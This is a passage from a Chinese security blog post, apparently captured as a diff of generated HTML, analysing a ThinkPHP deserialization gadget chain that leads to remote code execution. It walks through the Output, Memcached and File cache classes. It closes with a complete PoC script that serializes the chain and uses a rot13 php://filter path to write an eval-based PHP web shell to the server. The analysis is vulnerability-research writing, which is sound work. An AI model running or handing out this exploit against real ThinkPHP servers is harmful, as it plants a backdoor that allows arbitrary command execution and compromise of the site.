&#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&#x27;method not exists:&#x27;</span> . __CLASS__ . <span class="hljs-string">&#x27;-&gt;&#x27;</span> . $method);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这里有能够命令执行的函数call_user_func_array，$args，styles都是我们可控的</p>
+<p>$method是getAttr</p>
+<p>正常执行会调用到block方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">block</span>(<span class="hljs-params"><span class="hljs-variable">$style</span>, <span class="hljs-variable">$message</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">writeln</span>(<span class="hljs-string">&quot;&lt;<span class="hljs-subst">&#123;$style&#125;</span>&gt;<span class="hljs-subst">&#123;$message&#125;</span>&lt;/<span class="hljs-subst">$style</span>&gt;&quot;</span>);<br>    &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeln</span>(<span class="hljs-params"><span class="hljs-variable">$messages</span>, <span class="hljs-variable">$type</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">OUTPUT_NORMAL</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$messages</span>, <span class="hljs-literal">true</span>, <span class="hljs-variable">$type</span>);<br>    &#125;<br><br><span class="hljs-comment">//调用当前对象handle属性的write方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$messages</span>, <span class="hljs-variable">$newline</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$type</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">OUTPUT_NORMAL</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$messages</span>, <span class="hljs-variable">$newline</span>, <span class="hljs-variable">$type</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>block方法会走到write方法，通过设置handle的值可以调用某些类的write方法，或者调用到_call方法</p>
+<p>现在来搜索一下哪个类调用了write方法</p>
+<p>来到Memcached类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$sessID</span>, <span class="hljs-variable">$sessData</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;handler-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;session_name&#x27;</span>] . <span class="hljs-variable">$sessID</span>, <span class="hljs-variable">$sessData</span>, <span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;expire&#x27;</span>]);<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>继续搜索哪个类有set方法</p>
+<p>找到File类的set方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> function <span class="hljs-title function_">set</span><span class="hljs-params">($name, $value, $expire = <span class="hljs-literal">null</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (is_null($expire)) &#123;<br>            $expire = $<span class="hljs-built_in">this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($expire <span class="hljs-keyword">instanceof</span> \DateTime) &#123;<br>            $expire = $expire-&gt;getTimestamp() - time();<br>        &#125;<br>        $filename = $<span class="hljs-built_in">this</span>-&gt;getCacheKey($name, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">if</span> ($<span class="hljs-built_in">this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;<br>            $first = <span class="hljs-literal">true</span>;<br>        &#125;<br>        $data = serialize($value);<br>        <span class="hljs-keyword">if</span> ($<span class="hljs-built_in">this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            $data = gzcompress($data, <span class="hljs-number">3</span>);<br>        &#125;<br>        $data   = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, $expire) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . $data;<br>        $result = file_put_contents($filename, $data);<br>        <span class="hljs-keyword">if</span> ($result) &#123;<br>            isset($first) &amp;&amp; $<span class="hljs-built_in">this</span>-&gt;setTagItem($filename);<br>            clearstatcache();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个写文件的操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>)<br></code></pre></td></tr></table></figure>
+
+<p>主要关注$filename和$data是否可控</p>
+<p>$filename来源于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里需要关注到一个函数setTagItem($filename)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTagItem</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;tag) &#123;<br>            <span class="hljs-variable">$key</span>       = <span class="hljs-string">&#x27;tag_&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;tag);<br>            <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">has</span>(<span class="hljs-variable">$key</span>)) &#123;<br>                <span class="hljs-variable">$value</span>   = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>));<br>                <span class="hljs-variable">$value</span>[] = <span class="hljs-variable">$name</span>;<br>                <span class="hljs-variable">$value</span>   = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-variable">$value</span>));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-variable">$name</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进去发现这个函数中又执行了set函数，相当于整体上这个set函数会执行两遍</p>
+<p>这里将文件名又放进set函数，但是这次文件名已经是$value，或者说可控点已经是 $value了</p>
+<p>看过了$filename，现在来看看变量$data的情况</p>
+<p>关注到这里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br></code></pre></td></tr></table></figure>
+
+<p>翻译：<br> 构造最终写入缓存文件的内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//0000003600</span><br> <span class="hljs-keyword">exit</span>();<span class="hljs-meta">?&gt;</span><br>&lt;序列化或压缩后的数据&gt;<br></code></pre></td></tr></table></figure>
+
+<p>如果想办法能绕过函数exit();，传入php木马，那么就可以实现rce</p>
+<p>简述一下执行流程：</p>
+<p>set函数只执行了第一遍的时候，还没有加入缓存数据</p>
+<p>这个缓存文件名字叫098f6bcd4621d373cade4e832627b4f6.php(名称随机)</p>
+<p>此时的文件内容是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//0000003600</span><br> <span class="hljs-keyword">exit</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>之后会进入到setTagItem函数，存储我们输入的文件名</p>
+<p>此时的$value值就对应我们的文件名，如果把这个文件名改成木马，并且能够绕过exit()函数，就能成功实现rce</p>
+<p>这里使用伪协议的方式来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">https://zhuanlan.zhihu.com/p/410576800<br>https://blog.csdn.net/rfrder/article/details/113094542<br></code></pre></td></tr></table></figure>
+
+<p>最终poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/../thinkphp/base.php&#x27;</span>;<br><span class="hljs-variable">$model</span> = <span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Pivot</span>();<br><span class="hljs-variable">$append</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;getError&quot;</span>);<br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> \think\model\relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Merge</span>(), <br><span class="hljs-string">&#x27;\think\model\Merge&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setSelfRelation</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setModel</span>(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setBindAttr</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;test&quot;</span>=&gt;<span class="hljs-string">&quot;xx&quot;</span>));<br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> \think\db\<span class="hljs-title function_ invoke__">Query</span>();<br><span class="hljs-variable">$query</span>-&gt;<span class="hljs-title function_ invoke__">setModel</span>(<span class="hljs-keyword">new</span> \think\console\<span class="hljs-title function_ invoke__">Output</span>());<br><span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setQuery</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-variable">$output</span> = <span class="hljs-keyword">new</span> \think\console\<span class="hljs-title function_ invoke__">Output</span>();<br><span class="hljs-variable">$output</span>-&gt;<span class="hljs-title function_ invoke__">setStyles</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;getAttr&quot;</span>));<br><span class="hljs-variable">$handle1</span> = <span class="hljs-keyword">new</span> \think\cache\driver\<span class="hljs-title function_ invoke__">File</span>();<br><span class="hljs-variable">$handle1</span>-<br>&gt;<span class="hljs-title function_ invoke__">setOptions</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-string">&#x27;php://filter/write=string.rot13/resource=&lt;?</span><br><span class="hljs-string">cuc @riny($_TRG[_]);?&gt;&#x27;</span>,<span class="hljs-string">&quot;cache_subdir&quot;</span>=&gt;<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;prefix&quot;</span>=&gt;<span class="hljs-literal">false</span>, <br><span class="hljs-string">&#x27;data_compress&#x27;</span>=&gt;<span class="hljs-literal">false</span>));<br><span class="hljs-variable">$handle1</span>-&gt;<span class="hljs-title function_ invoke__">setTag</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<br><span class="hljs-variable">$handle2</span> = <span class="hljs-keyword">new</span> \think\session\driver\<span class="hljs-title function_ invoke__">Memcached</span>();<br><span class="hljs-variable">$handle2</span>-&gt;<span class="hljs-title function_ invoke__">setHandler</span>(<span class="hljs-variable">$handle1</span>);<br><span class="hljs-variable">$output</span>-&gt;<span class="hljs-title function_ invoke__">setHandle</span>(<span class="hljs-variable">$handle2</span>);<br><span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setParent</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setError</span>(<span class="hljs-variable">$error</span>);<br><span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setAppend</span>(<span class="hljs-variable">$append</span>);<br><span class="hljs-variable">$files</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$model</span>);<br><span class="hljs-variable">$window</span> = <span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-variable">$window</span>-&gt;<span class="hljs-title function_ invoke__">setFiles</span>(<span class="hljs-variable">$files</span>);<br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$window</span>);<br><span class="hljs-comment">//$y = unserialize($x);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$x</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">PHP代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+      
+        <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#PHP代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ThinkPHP反序列化到rce</div>
+      <div>http://huang-d1.github.io/2026/01/04/ThinkPHP反序列化到rce/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>huangdi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/10/ThinkPHP5%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="ThinkPHP5 RCE漏洞复现与分析">
+                        <span class="hidden-mobile">ThinkPHP5 RCE漏洞复现与分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
